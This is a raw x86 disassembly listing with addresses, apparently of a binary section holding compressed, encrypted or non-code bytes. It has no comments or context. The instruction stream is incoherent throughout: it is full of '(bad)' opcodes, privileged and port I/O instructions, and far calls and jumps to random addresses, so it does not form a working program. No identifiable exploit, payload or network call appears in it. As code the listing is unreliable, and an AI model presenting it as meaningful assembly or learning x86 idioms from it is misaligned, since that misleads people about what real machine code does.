  419314:	or     dl,BYTE PTR [esi]
  419316:	mov    ds,eax
  419318:	push   eax
  419319:	inc    edi
  41931a:	mov    ds:0x27efb1aa,eax
  41931f:	popa   
  419320:	jno    0x419368
  419322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419323:	xchg   ebp,eax
  419324:	xor    ah,BYTE PTR [ecx+0x11]
  419327:	cmp    ebx,eax
  419329:	pop    eax
  41932a:	dec    ebp
  41932b:	add    ch,BYTE PTR [eax]
  41932d:	fcomp  QWORD PTR [edi+0x76f0745b]
  419333:	rol    DWORD PTR [esi+0x46c15a2e],0xb8
  41933a:	stos   DWORD PTR es:[edi],eax
  41933b:	packsswb mm1,QWORD PTR [edx]
  41933e:	out    0x41,eax
  419340:	push   eax
  419341:	push   ebx
  419342:	dec    ecx
  419343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419344:	(bad)  
  419345:	xor    DWORD PTR [eax+0x32],esp
  419348:	and    ebp,DWORD PTR [esi-0x50a87ecd]
  41934e:	or     ebx,DWORD PTR [esi-0x2a62fdd1]
  419354:	push   ecx
  419355:	add    ecx,ebx
  419357:	sub    eax,0x209cc67
  41935c:	mov    edi,0x12279179
  419361:	jbe    0x419334
  419363:	adc    esi,DWORD PTR [edx-0x197ac605]
  419369:	fbstp  TBYTE PTR [esi-0x22]
  41936c:	(bad)  
  41936d:	ins    DWORD PTR es:[edi],dx
  41936e:	sbb    BYTE PTR [esi],dh
  419370:	loop   0x419389
  419372:	mov    ds:0xa3fc31cf,al
  419377:	inc    edi
  419378:	add    al,0x7
  41937a:	or     bl,BYTE PTR [eax+ebp*1-0x14]
  41937e:	cmc    
  41937f:	push   ebp
  419380:	mov    ds:0xa02b6f39,eax
  419385:	out    0xc9,al
  419387:	mov    ecx,DWORD PTR [ebp-0x42d58858]
  41938d:	icebp  
  41938e:	and    al,0xd6
  419390:	es jnp 0x4193e6
  419393:	jmp    0xa5e3:0xb45a2c29
  41939a:	inc    edi
  41939b:	push   esi
  41939c:	or     ebp,DWORD PTR [edx+0x5d]
  41939f:	mov    al,0x5d
  4193a1:	dec    eax
  4193a2:	retf   0xc0a5
  4193a5:	and    al,0xb8
  4193a7:	arpl   WORD PTR [ebp-0x3bfe4ae8],ax
  4193ad:	leave  
  4193ae:	pop    ebp
  4193af:	xor    ch,BYTE PTR [edx+0x17f2cb56]
  4193b5:	call   0xf216:0x7c700b46
  4193bc:	or     eax,0x9fc6c0fe
  4193c1:	sti    
  4193c2:	fadd   DWORD PTR [ebp+0x7d161898]
  4193c8:	mov    ecx,0x550473a8
  4193cd:	pop    edx
  4193ce:	leave  
  4193cf:	dec    esi
  4193d0:	stos   BYTE PTR es:[edi],al
  4193d1:	and    esi,esp
  4193d3:	mov    esp,0xb1cc38d5
  4193d8:	and    ch,BYTE PTR [eax-0x3e24614c]
  4193de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193df:	sar    BYTE PTR [ecx-0x4cfcb898],1
  4193e5:	dec    ecx
  4193e6:	icebp  
  4193e7:	mov    bh,0x9a
  4193e9:	call   0xdbf68fbc
  4193ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193ef:	cmp    al,0xd5
  4193f1:	or     eax,0x81152d06
  4193f6:	jbe    0x419386
  4193f8:	cld    
  4193f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193fa:	(bad)
  4193fe:	call   0x6bb6:0xc5bbc433
  419405:	ds loop 0x4193ca
  419408:	sbb    al,0x7a
  41940a:	repz rcr BYTE PTR [eax-0x5],1
  41940e:	pop    es
  41940f:	mov    al,ds:0x2b6d2c30
  419414:	add    al,0x34
  419416:	inc    esi
  419417:	pop    esi
  419418:	les    ecx,FWORD PTR [edx+0x29035f9d]
  41941e:	ds pop esp
  419420:	ret    
  419421:	and    edi,edi
  419423:	sbb    esi,ecx
  419425:	enter  0x50f0,0x4
  419429:	xchg   edx,eax
  41942a:	cmp    al,0x58
  41942c:	lods   eax,DWORD PTR ds:[esi]
  41942d:	ds mov ch,0xe5
  419430:	pushf  
  419431:	inc    edx
  419432:	mov    fs,sp
  419435:	push   edi
  419436:	xchg   ecx,eax
  419437:	cs leave 
  419439:	mov    edx,0x9c2ba798
  41943e:	out    dx,eax
  41943f:	cli    
  419440:	add    esi,edx
  419442:	fcomp  DWORD PTR [ebx]
  419444:	daa    
  419445:	jle    0x4194bc
  419447:	es dec edx
  419449:	push   ecx
  41944a:	dec    ebp
  41944b:	adc    eax,0x2348526d
  419450:	cmp    eax,0x74d25912
  419455:	scas   al,BYTE PTR es:[edi]
  419456:	or     ecx,esi
  419458:	scas   eax,DWORD PTR es:[edi]
  419459:	pop    eax
  41945a:	das    
  41945b:	inc    ebx
  41945c:	int    0x7c
  41945e:	jns    0x419407
  419460:	pushf  
  419461:	jne    0x4194a9
  419463:	sahf   
  419464:	pop    edx
  419465:	ins    DWORD PTR es:[edi],dx
  419466:	mov    ebx,DWORD PTR [ecx+0x16]
  419469:	lods   eax,DWORD PTR ds:[esi]
  41946a:	jg     0x419484
  41946c:	fisub  WORD PTR [esi-0x5]
  41946f:	neg    DWORD PTR [edi]
  419471:	xchg   BYTE PTR [ecx],ah
  419473:	sub    bl,cl
  419475:	xchg   ecx,eax
  419476:	jmp    0x9d14:0x31dcdaf0
  41947d:	pop    esp
  41947e:	dec    edi
  41947f:	jle    0x419431
  419481:	(bad)  
  419482:	dec    edi
  419483:	and    dl,BYTE PTR [esi]
  419485:	mov    ebx,DWORD PTR [ebx-0xc]
  419488:	jl     0x41947c
  41948a:	sahf   
  41948b:	int3   
  41948c:	add    eax,0x5ed5bc32
  419491:	jno    0x419483
  419493:	push   ebx
  419494:	js     0x419440
  419496:	push   0x72
  419498:	and    DWORD PTR [edx],0x51ffcb11
  41949e:	mov    dh,0xb7
  4194a0:	aas    
  4194a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194a2:	mov    bl,0x37
  4194a4:	pop    ds
  4194a5:	sub    al,0x60
  4194a7:	mov    ah,0x1a
  4194a9:	push   eax
  4194aa:	lock ror BYTE PTR [ebx],1
  4194ad:	fld    TBYTE PTR [ebx]
  4194af:	js     0x41950a
  4194b1:	idiv   BYTE PTR [edi+0x3ff47b31]
  4194b7:	imul   ecx,DWORD PTR [edi-0x4f60abcf],0x302abddd
  4194c1:	call   0x1c043c8e
  4194c6:	adc    bh,bl
  4194c8:	push   ecx
  4194c9:	cmp    BYTE PTR [esi],bl
  4194cb:	mov    al,0xaf
  4194cd:	les    edx,FWORD PTR [ecx]
  4194cf:	adc    bh,al
  4194d1:	rcl    BYTE PTR [di-0x5b],1
  4194d5:	loope  0x419538
  4194d7:	push   ecx
  4194d8:	mov    BYTE PTR [esi-0x5f],ch
  4194db:	mov    ds:0xfda6a45b,al
  4194e0:	dec    edx
  4194e1:	js     0x4194ba
  4194e3:	adc    eax,0x219c6401
  4194e8:	mov    ah,0x13
  4194ea:	xor    bl,ch
  4194ec:	ret    
  4194ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194ee:	jl     0x41948e
  4194f0:	dec    ecx
  4194f1:	(bad)  
  4194f3:	sbb    eax,0x4ec11b89
  4194f9:	mov    esi,0xc20e5e33
  4194fe:	cmp    eax,0x9efc259e
  419503:	fsub   DWORD PTR ds:0x4fc29029
  419509:	(bad)  
  41950a:	jg     0x41955f
  41950c:	lahf   
  41950d:	rcr    al,cl
  41950f:	retf   0xe7f8
  419512:	imul   esi,DWORD PTR [ebx+0x3a],0x61
  419516:	mov    ecx,0x57ff5a62
  41951b:	sub    BYTE PTR [ebx],ah
  41951d:	push   cs
  41951e:	xchg   edx,eax
  41951f:	fwait
  419520:	push   ss
  419521:	xor    ah,BYTE PTR [edx-0x4396f9a2]
  419527:	retf   
  419528:	sar    DWORD PTR [ebx-0x49],1
  41952b:	add    DWORD PTR [edx-0x68],eax
  41952e:	mov    ebp,ebx
  419530:	push   es
  419531:	(bad)  
  419532:	xchg   edx,eax
  419533:	push   ds
  419534:	mov    esi,0xe0c5861f
  419539:	call   0x8ae30f4a
  41953e:	aas    
  41953f:	jl     0x41958e
  419541:	mov    al,ds:0xee13fdac
  419546:	inc    esi
  419547:	dec    ecx
  419548:	push   ebx
  419549:	ret    
  41954a:	arpl   dx,cx
  41954c:	sbb    BYTE PTR [esi+ebp*4],bh
  41954f:	inc    edx
  419550:	add    BYTE PTR [eax+0x41290d30],bl
  419556:	cmp    ebp,DWORD PTR [edi+0x77091528]
  41955c:	scas   al,BYTE PTR es:[edi]
  41955d:	xchg   ebx,eax
  41955e:	bound  esi,QWORD PTR [esi]
  419560:	mov    al,ds:0x9a35db4
  419565:	adc    cl,BYTE PTR [edx-0x59]
  419568:	jle    0x4194f0
  41956a:	call   0x51bb:0x71f6ae00
  419571:	mov    edx,fs
  419573:	cmp    al,0xc
  419575:	stos   BYTE PTR es:[edi],al
  419576:	mov    bh,0x3d
  419578:	std    
  419579:	jno    0x41953e
  41957b:	or     ch,bl
  41957d:	scas   eax,DWORD PTR es:[edi]
  41957e:	jbe    0x4195c4
  419580:	test   BYTE PTR [ebp-0x38bf7390],ch
  419586:	mov    bl,0x2f
  419588:	dec    eax
  419589:	and    esi,DWORD PTR [edx-0x3468b225]
  41958f:	out    0xd7,eax
  419591:	mov    eax,ds:0x85c2b983
  419596:	lods   al,BYTE PTR fs:[esi]
  419598:	pop    es
  419599:	nop
  41959a:	mov    DWORD PTR [ecx+0x31],ecx
  41959d:	addr16 adc esi,ebx
  4195a0:	lahf   
  4195a1:	pop    ds
  4195a2:	add    al,0x49
  4195a4:	sti    
  4195a5:	mov    ds:0x93fb42b6,eax
  4195aa:	bnd jbe 0x41954d
  4195ad:	sar    BYTE PTR [ebx+0x363d62a0],0x5c
  4195b4:	and    edi,esp
  4195b6:	mov    edx,0x9062809f
  4195bb:	pop    es
  4195bc:	and    BYTE PTR [edx],bh
  4195be:	pushf  
  4195bf:	inc    edi
  4195c0:	fnsave [ebx+0x5d]
  4195c3:	sub    cl,0x24
  4195c6:	xchg   ebx,eax
  4195c7:	je     0x4195e8
  4195c9:	fwait
  4195ca:	nop
  4195cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195cc:	daa    
  4195cd:	inc    ebp
  4195ce:	retf   0x447e
  4195d1:	mov    al,ds:0x99c1a6fc
  4195d6:	xor    dl,dh
  4195d8:	ret    0xcbca
  4195db:	dec    ebp
  4195dc:	imul   ebx,DWORD PTR [edx],0x4986a7b9
  4195e2:	jae    0x419595
  4195e4:	inc    ebx
  4195e5:	jmp    0x8d9a:0xdf985605
  4195ec:	push   cs
  4195ed:	rol    DWORD PTR ds:0xb65098d4,0x15
  4195f4:	fldenv [edi+edi*4]
  4195f7:	and    DWORD PTR [esi],ecx
  4195f9:	sub    BYTE PTR [edx],bl
  4195fb:	das    
  4195fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195fd:	jmp    0x41963c
  4195ff:	int    0xb3
  419601:	jecxz  0x4195b9
  419603:	popf   
  419604:	mov    bl,0x8c
  419606:	call   0x5aa65a20
  41960b:	mov    cl,0xf1
  41960d:	adc    esi,DWORD PTR [ebx+0x32]
  419610:	push   ss
  419611:	fstp   TBYTE PTR [eax]
  419613:	jp     0x419649
  419615:	fisttp QWORD PTR [edi-0x53ee3c27]
  41961b:	adc    ebx,esp
  41961d:	iret   
  41961e:	dec    edx
  41961f:	retf   0xfa5f
  419622:	dec    ebx
  419623:	xor    ecx,esi
  419625:	add    BYTE PTR [ecx+0x6d1c6610],0x43
  41962c:	pop    edi
  41962d:	sbb    eax,0x2a4793c4
  419632:	or     esp,0x61
  419635:	mov    eax,ds:0x3750100b
  41963a:	xchg   DWORD PTR [eax],eax
  41963c:	dec    ebp
  41963d:	mov    eax,0xe83d5e5f
  419642:	pop    ebx
  419643:	sub    al,0x58
  419645:	das    
  419646:	add    DWORD PTR [edx],ebx
  419648:	nop
  419649:	retf   0xd19c
  41964c:	test   eax,0xe9fc1872
  419651:	adc    eax,0xaff8526c
  419656:	pop    ds
  419657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419658:	rcr    BYTE PTR [ecx],cl
  41965a:	adc    ax,0x99a8
  41965e:	hlt    
  41965f:	je     0x419624
  419661:	and    dl,cl
  419663:	addr16 jl 0x41961c
  419666:	mov    ebx,0xf38ee51e
  41966b:	xchg   esp,eax
  41966c:	clc    
  41966d:	mov    ss,ebx
  41966f:	loopne 0x419630
  419671:	jl     0x41963d
  419673:	test   DWORD PTR [ebp-0x640166a6],ecx
  419679:	sub    BYTE PTR [esi-0x7b707aef],dl
  41967f:	mov    edi,0xc191c72e
  419684:	jecxz  0x419608
  419686:	xchg   ebp,eax
  419687:	push   cs
  419688:	das    
  419689:	mov    dh,BYTE PTR [eax+0x78]
  41968c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41968d:	cmp    al,0x46
  41968f:	fistp  DWORD PTR [edx+ebx*2-0x5]
  419693:	fwait
  419694:	test   eax,0x4a29efd4
  419699:	adc    eax,0x61cd419a
  41969e:	cmp    edi,DWORD PTR [edx+0x77]
  4196a1:	mov    bl,0x4c
  4196a3:	fst    st(4)
  4196a5:	push   cs
  4196a6:	std    
  4196a7:	push   0xa085243f
  4196ac:	fisttp DWORD PTR [ebx-0x38]
  4196af:	leave  
  4196b0:	or     eax,DWORD PTR [esi]
  4196b2:	inc    esp
  4196b3:	hlt    
  4196b4:	adc    ch,BYTE PTR [esi]
  4196b6:	je     0x41965e
  4196b8:	xor    al,0xa7
  4196ba:	std    
  4196bb:	mov    edi,0xf777270c
  4196c0:	and    BYTE PTR [edx+0x34],al
  4196c3:	hlt    
  4196c4:	and    DWORD PTR [ebp-0x21e147c6],eax
  4196ca:	add    dl,BYTE PTR es:[ecx-0x4a]
  4196ce:	cmc    
  4196cf:	retf   
  4196d0:	es aad 0xd8
  4196d3:	bound  ebx,QWORD PTR [ecx+0x5f]
  4196d6:	aad    0x0
  4196d8:	ds inc edi
  4196da:	mov    ah,0xea
  4196dc:	sbb    BYTE PTR [ebx+ebx*8],ch
  4196df:	cli    
  4196e0:	fs cwde 
  4196e2:	ret    0x6227
  4196e5:	call   FWORD PTR [edi+0x1a]
  4196e8:	jg     0x41972a
  4196ea:	and    al,0xd9
  4196ec:	mov    edi,DWORD PTR [ebp+0x55]
  4196ef:	pop    esp
  4196f0:	outs   dx,BYTE PTR ds:[esi]
  4196f1:	jo     0x4196c9
  4196f3:	shl    cl,cl
  4196f5:	sub    ah,bh
  4196f7:	inc    ebx
  4196f8:	pop    esi
  4196f9:	call   0x9b2b:0x823df2d3
  419700:	cmp    DWORD PTR [eax-0x4543793e],eax
  419706:	stos   BYTE PTR es:[edi],al
  419707:	jecxz  0x419779
  419709:	rcr    BYTE PTR [esi+0x73],0xd7
  41970d:	pop    edx
  41970e:	shl    BYTE PTR [edi-0x21],cl
  419711:	aam    0xee
  419713:	outs   dx,DWORD PTR ds:[esi]
  419714:	dec    ebp
  419715:	in     al,0x78
  419717:	out    dx,al
  419718:	push   esi
  419719:	or     DWORD PTR [esi-0x61dd1da6],esp
  41971f:	(bad)  
  419720:	cmp    BYTE PTR [ebx-0x199a550d],ch
  419726:	(bad)  [eax]
  419728:	dec    eax
  419729:	pop    esp
  41972a:	mov    WORD PTR [edi],?
  41972c:	pop    esi
  41972d:	mov    eax,ds:0x3b59f79c
  419732:	jb     0x4197a6
  419734:	ja     0x41976c
  419736:	aad    0x44
  419738:	es es je 0x419752
  41973c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41973d:	adc    esi,DWORD PTR [eax+0x12]
  419740:	mov    ebx,0x38c86a1
  419745:	dec    ebx
  419746:	adc    DWORD PTR [edi+0xb8e20d9],esp
  41974c:	fild   QWORD PTR es:[edi-0x52]
  419750:	add    eax,0x33aaf802
  419755:	imul   esp,DWORD PTR [esp+edi*2+0x3d9d0f0d],0x0
  41975d:	into   
  41975e:	pop    eax
  41975f:	add    esp,DWORD PTR [ebp-0x464b28b2]
  419765:	adc    BYTE PTR [edx],0xe7
  419768:	dec    ebx
  419769:	arpl   cx,di
  41976b:	fsubr  DWORD PTR [edx]
  41976d:	lods   eax,DWORD PTR ds:[esi]
  41976e:	adc    DWORD PTR [edi-0x144a8062],ebx
  419774:	ret    0x3649
  419777:	and    DWORD PTR [edi+edi*8],esi
  41977a:	mov    eax,ds:0x4e9e7c23
  41977f:	inc    ecx
  419780:	lahf   
  419781:	push   ebx
  419782:	and    DWORD PTR [esi+0x180a6043],eax
  419788:	jnp    0x419736
  41978a:	mov    ebx,0xb61c7ac7
  41978f:	sbb    eax,0x472bef5b
  419794:	xchg   ebp,eax
  419795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419796:	xor    DWORD PTR [edi-0x46],ebx
  419799:	pop    eax
  41979a:	aaa    
  41979b:	clc    
  41979c:	add    ebp,DWORD PTR [eax-0x70b50550]
  4197a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197a3:	cmp    BYTE PTR [edx+edx*4-0xe898fe9],dl
  4197aa:	sbb    esi,edx
  4197ac:	repz jae 0x419797
  4197af:	inc    esi
  4197b0:	jae    0x41980b
  4197b2:	out    dx,eax
  4197b3:	cmc    
  4197b4:	adc    dl,dl
  4197b6:	daa    
  4197b7:	ror    DWORD PTR [esi+0x23],0xb2
  4197bb:	leave  
  4197bc:	outs   dx,DWORD PTR ds:[esi]
  4197bd:	or     eax,0xcd17a801
  4197c2:	mov    dh,0x23
  4197c4:	mov    ds:0xeb086a5d,eax
  4197c9:	scas   al,BYTE PTR es:[edi]
  4197ca:	das    
  4197cb:	lods   eax,DWORD PTR ds:[esi]
  4197cc:	pushf  
  4197cd:	adc    DWORD PTR [ecx-0x1a],esp
  4197d0:	jbe    0x41980b
  4197d2:	xchg   ebp,eax
  4197d3:	ins    BYTE PTR es:[edi],dx
  4197d4:	(bad)  
  4197d5:	addr16 fnsetpm(287 only) 
  4197d8:	ror    DWORD PTR [ecx+0x34b719aa],cl
  4197de:	pop    ss
  4197df:	stc    
  4197e0:	jo     0x4197da
  4197e2:	push   ebp
  4197e3:	test   al,0xfa
  4197e5:	jp     0x419835
  4197e7:	and    BYTE PTR [edi-0x2d1f031d],dl
  4197ed:	lock out dx,al
  4197ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197f0:	and    DWORD PTR [edi],0x58
  4197f3:	lock push edx
  4197f5:	sbb    al,0x95
  4197f7:	aaa    
  4197f8:	test   eax,0x73565f1b
  4197fd:	inc    ecx
  4197fe:	sbb    DWORD PTR [ebx],0x65
  419801:	and    bl,bh
  419803:	sub    al,0x97
  419805:	push   cs
  419806:	mov    al,ds:0xc106746c
  41980b:	pop    ss
  41980c:	push   esi
  41980d:	xor    al,0xda
  41980f:	push   ecx
  419810:	and    DWORD PTR [edi-0x4b],edx
  419813:	mov    eax,0xf9fdf3b7
  419818:	jl     0x419867
  41981a:	push   ds
  41981b:	sub    al,0xdb
  41981d:	sbb    eax,0x143a5e7d
  419822:	les    ecx,FWORD PTR [esi-0x77409588]
  419828:	or     eax,DWORD PTR [edx]
  41982a:	js     0x41988e
  41982c:	imul   ebx,DWORD PTR [eax+edx*4-0x140f3028],0xffffffe8
  419834:	lds    edi,FWORD PTR [eax+0x22]
  419837:	cmp    al,0x4d
  419839:	push   ecx
  41983a:	mov    ebp,0x91507738
  41983f:	scas   al,BYTE PTR es:[edi]
  419840:	shl    dh,1
  419842:	mov    ebp,0xc65ebcce
  419847:	push   edx
  419848:	sub    DWORD PTR ds:0x2877ada0,ebx
  41984e:	dec    ebx
  41984f:	cmp    DWORD PTR [esp+eiz*8-0x70],edi
  419853:	lds    esp,FWORD PTR [eax-0x5c896277]
  419859:	xor    bh,BYTE PTR [eax-0x120a7cdc]
  41985f:	out    dx,eax
  419860:	sbb    al,ch
  419862:	repz pop ebp
  419864:	mov    eax,ds:0xe06d57ab
  419869:	xchg   ebp,eax
  41986a:	pop    ds
  41986b:	stos   DWORD PTR es:[edi],eax
  41986c:	xchg   dh,dl
  41986e:	ins    DWORD PTR es:[edi],dx
  41986f:	xchg   ebx,eax
  419870:	dec    edi
  419871:	or     eax,0xce0b016
  419876:	and    dl,al
  419878:	test   al,0x95
  41987a:	stc    
  41987b:	mov    ebp,0xd37518d9
  419880:	(bad)  
  419881:	into   
  419882:	cld    
  419883:	push   ebx
  419884:	loop   0x41987b
  419886:	inc    ecx
  419887:	int    0x98
  419889:	mov    ch,0x30
  41988b:	mov    eax,0x2785e93f
  419890:	sahf   
  419891:	div    ch
  419893:	bound  ebp,QWORD PTR [ebx+0x27ba6d4c]
  419899:	lahf   
  41989a:	jp     0x419887
  41989c:	retf   0xbe75
  41989f:	cmpxchg dl,al
  4198a2:	mov    ecx,0xb98a511f
  4198a7:	sbb    dl,bl
  4198a9:	mov    DWORD PTR [edi],edx
  4198ab:	ds cdq 
  4198ad:	int3   
  4198ae:	jns    0x4198be
  4198b0:	in     al,dx
  4198b1:	or     BYTE PTR [ebx+0x1af1157d],dh
  4198b7:	arpl   WORD PTR [ebp-0x5d],di
  4198ba:	dec    ebx
  4198bb:	mov    ebp,0x67d03603
  4198c0:	ffreep st(7)
  4198c2:	call   0x38f0e548
  4198c7:	retf   0xb1b1
  4198ca:	and    bh,BYTE PTR [ebp-0x44b65630]
  4198d0:	pop    DWORD PTR [ebx]
  4198d2:	and    dh,BYTE PTR [ecx]
  4198d4:	mov    ch,0xfa
  4198d6:	lea    eax,[ecx]
  4198d8:	dec    edi
  4198d9:	aaa    
  4198da:	stos   DWORD PTR es:[edi],eax
  4198db:	les    edx,FWORD PTR [esi+0x3ff431ea]
  4198e1:	bound  eax,QWORD PTR [edi]
  4198e3:	sbb    ebx,edi
  4198e5:	jge    0x419945
  4198e7:	lahf   
  4198e8:	mov    bl,0xd5
  4198ea:	cmc    
  4198eb:	adc    al,0x2d
  4198ed:	inc    ecx
  4198ee:	dec    ecx
  4198ef:	mov    cl,0xe7
  4198f1:	jecxz  0x4198bb
  4198f3:	and    DWORD PTR [esi+edx*8-0x18],0x121b2d1
  4198fb:	aas    
  4198fc:	mov    ecx,0xec22473d
  419901:	jne    0x419973
  419903:	pusha  
  419904:	test   al,0x21
  419906:	sub    ebx,0xaa4fa476
  41990c:	mov    bh,0x3c
  41990e:	push   edx
  41990f:	inc    ecx
  419910:	pop    es
  419911:	inc    BYTE PTR [eax]
	...
  419ae7:	add    BYTE PTR [eax],al
  419ae9:	add    BYTE PTR [edx+0xc],ch
  419aec:	lea    ebx,[eax-0x1806611]
  419af2:	into   
  419af3:	out    dx,al
  419af4:	popf   
  419af5:	adc    eax,eax
  419af7:	mul    bh
  419af9:	ja     0x419ace
  419afb:	xchg   ebx,eax
  419afc:	add    DWORD PTR [eax],eax
  419afe:	and    al,BYTE PTR [edi]
  419b00:	add    BYTE PTR [eax],al
  419b02:	aad    0x2b
  419b04:	scas   al,BYTE PTR es:[edi]
  419b05:	call   0x8244:0xfa74b662
  419b0c:	in     al,dx
  419b0d:	pop    ebp
  419b0e:	adc    BYTE PTR [ebx+edi*2+0x78],0x3b
  419b13:	xchg   BYTE PTR [edx+0xc],dh
  419b16:	and    BYTE PTR [ebp+0x3a],ch
  419b19:	jl     0x419b14
  419b1b:	arpl   WORD PTR [ebx+0x2208a94d],cx
  419b21:	ret    0xb0f0
  419b24:	mov    ?,WORD PTR [eax-0x21f45c3]
  419b2a:	test   DWORD PTR [esi+0x6c5b9d80],esi
  419b30:	pop    esp
  419b31:	sbb    ah,BYTE PTR [ecx]
  419b33:	retf   0xf454
  419b36:	cmp    al,0xdc
  419b38:	jl     0x419b51
  419b3a:	sub    bl,0x74
  419b3d:	pop    ss
  419b3e:	mov    bh,cl
  419b40:	dec    edx
  419b41:	mov    bl,bl
  419b43:	cld    
  419b44:	sbb    DWORD PTR [ecx],ebp
  419b46:	adc    eax,0x2ed70e2c
  419b4b:	dec    esp
  419b4c:	or     BYTE PTR [eax-0x50],0xbb
  419b50:	dec    edi
  419b51:	out    dx,eax
  419b52:	sub    eax,0x1ca6bd2e
  419b57:	fisubr WORD PTR [ebx+0x671dd20f]
  419b5d:	push   ecx
  419b5e:	adc    eax,0x96346cb9
  419b63:	mov    ecx,0x648491c6
  419b68:	hlt    
  419b69:	sub    eax,edx
  419b6b:	xchg   ebx,eax
  419b6c:	add    bl,cl
  419b6e:	ja     0x419bd8
  419b70:	mov    DWORD PTR [edi+esi*8-0x5b02b408],ebx
  419b77:	mov    DWORD PTR [esi-0x32],edi
  419b7a:	xor    bl,BYTE PTR [edx]
  419b7c:	call   0x79b0:0x83809c7c
  419b83:	mov    eax,eax
  419b85:	popa   
  419b86:	add    ebx,DWORD PTR [ebp-0x24f3d63f]
  419b8c:	fsubr  QWORD PTR [esi-0x455eef6b]
  419b92:	add    al,0xe7
  419b94:	daa    
  419b95:	int    0x5a
  419b97:	pop    edx
  419b99:	and    eax,0xb5db3412
  419b9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b9f:	fidivr WORD PTR [esi+eax*4+0x73c4999c]
  419ba6:	mov    ebp,0xbbb42b55
  419bab:	shl    DWORD PTR [esp+esi*2],1
  419bae:	jp     0x419b5b
  419bb0:	je     0x419b83
  419bb2:	jb     0x419c07
  419bb4:	xchg   ebp,eax
  419bb5:	add    eax,0x144da722
  419bba:	push   edx
  419bbb:	add    esp,DWORD PTR [edi-0x3ad81845]
  419bc1:	inc    ecx
  419bc2:	sbb    ebx,DWORD PTR [ecx+0x40]
  419bc5:	adc    al,0xd
  419bc7:	dec    ecx
  419bc8:	and    al,0x39
  419bca:	jno    0x419bfc
  419bcc:	in     al,0xd9
  419bce:	pop    ecx
  419bcf:	jecxz  0x419b62
  419bd1:	jle    0x419b7b
  419bd3:	xchg   edx,eax
  419bd4:	push   esi
  419bd5:	pushf  
  419bd6:	mov    bh,0x9f
  419bd8:	jmp    0x419c16
  419bda:	push   edx
  419bdb:	mov    ds:0xc17c174d,al
  419be0:	lea    ebp,[ebp+0x293fd14d]
  419be6:	mov    esi,0x83844dd5
  419beb:	lods   eax,DWORD PTR ds:[esi]
  419bec:	or     eax,0x18573133
  419bf1:	inc    esp
  419bf2:	ret    0xbc81
  419bf5:	cmp    al,0xd5
  419bf7:	push   esp
  419bf8:	out    0xd4,al
  419bfa:	sub    edx,DWORD PTR [edx]
  419bfc:	add    eax,0x24
  419bff:	outs   dx,DWORD PTR ds:[esi]
  419c00:	or     esp,DWORD PTR [edi+0x46]
  419c03:	in     eax,dx
  419c04:	push   eax
  419c05:	(bad)  
  419c06:	(bad)  
  419c07:	cld    
  419c08:	sub    eax,DWORD PTR [ecx+0x3476b705]
  419c0e:	cdq    
  419c0f:	dec    ebp
  419c10:	push   ecx
  419c11:	ret    
  419c12:	push   edi
  419c13:	test   al,0x71
  419c15:	sub    BYTE PTR [ebx+0x61],dl
  419c18:	and    BYTE PTR ds:0xf0550e0f,0x5c
  419c1f:	push   ss
  419c20:	test   eax,0x721ea1df
  419c25:	xchg   DWORD PTR [ecx-0x71],ebp
  419c28:	push   es
  419c29:	into   
  419c2a:	push   cs
  419c2b:	ins    BYTE PTR es:[edi],dx
  419c2c:	test   al,0xd2
  419c2e:	loopne 0x419bd1
  419c30:	into   
  419c31:	push   cs
  419c32:	xchg   DWORD PTR ds:[edx],edx
  419c35:	mov    ds:0x88969636,al
  419c3a:	sti    
  419c3b:	inc    ebp
  419c3c:	pop    ds
  419c3d:	inc    eax
  419c3e:	push   ebp
  419c3f:	in     eax,0x76
  419c41:	mov    ah,0x7
  419c43:	and    DWORD PTR ds:0x2a332253,ecx
  419c49:	pop    ss
  419c4a:	(bad)
  419c4e:	jp     0x419c5b
  419c50:	jnp    0x419ca2
  419c52:	cli    
  419c53:	test   eax,0xdc6c582f
  419c58:	lds    ebx,FWORD PTR [edi-0x6b]
  419c5b:	mov    DWORD PTR [ebp-0x52],ebp
  419c5e:	ds mov al,0x3d
  419c61:	(bad)  
  419c63:	(bad)  
  419c64:	lods   eax,DWORD PTR ds:[esi]
  419c65:	sub    eax,0x98f85253
  419c6a:	js     0x419ca2
  419c6c:	in     eax,dx
  419c6d:	test   esp,ecx
  419c6f:	out    0x9e,eax
  419c71:	sbb    eax,0xfc5ce3f5
  419c76:	sbb    eax,0x58695491
  419c7b:	xchg   edx,eax
  419c7c:	adc    al,0x32
  419c7e:	and    dh,al
  419c80:	push   es
  419c81:	add    al,0x57
  419c83:	jbe    0x419cc5
  419c85:	add    BYTE PTR [esi+0x61],al
  419c88:	jmp    0x571f3ce0
  419c8d:	test   BYTE PTR [eax-0x735bde5e],0x88
  419c94:	mov    gs,WORD PTR [esi-0x6]
  419c97:	fiadd  WORD PTR [esi-0x62]
  419c9a:	and    esp,esp
  419c9c:	sub    dl,ah
  419c9e:	or     BYTE PTR ds:0x51e2db17,cl
  419ca4:	test   eax,0x73be47d4
  419ca9:	push   esi
  419caa:	adc    DWORD PTR [esi+ebx*4+0x79b5f83a],ebp
  419cb1:	lods   al,BYTE PTR ds:[esi]
  419cb2:	retf   
  419cb3:	adc    edi,edx
  419cb5:	jmp    0x419c8c
  419cb7:	mov    ds:0xdbed6cf8,eax
  419cbc:	pop    edx
  419cbd:	sub    al,0xe7
  419cbf:	jbe    0x419d33
  419cc1:	xchg   al,ch
  419cc3:	mov    ecx,0x885dbf62
  419cc8:	out    0x68,eax
  419cca:	ror    BYTE PTR [ebx+eax*2+0x64f3e5a5],0xb6
  419cd2:	mov    edx,0xdb5bc5d1
  419cd7:	adc    cl,0xae
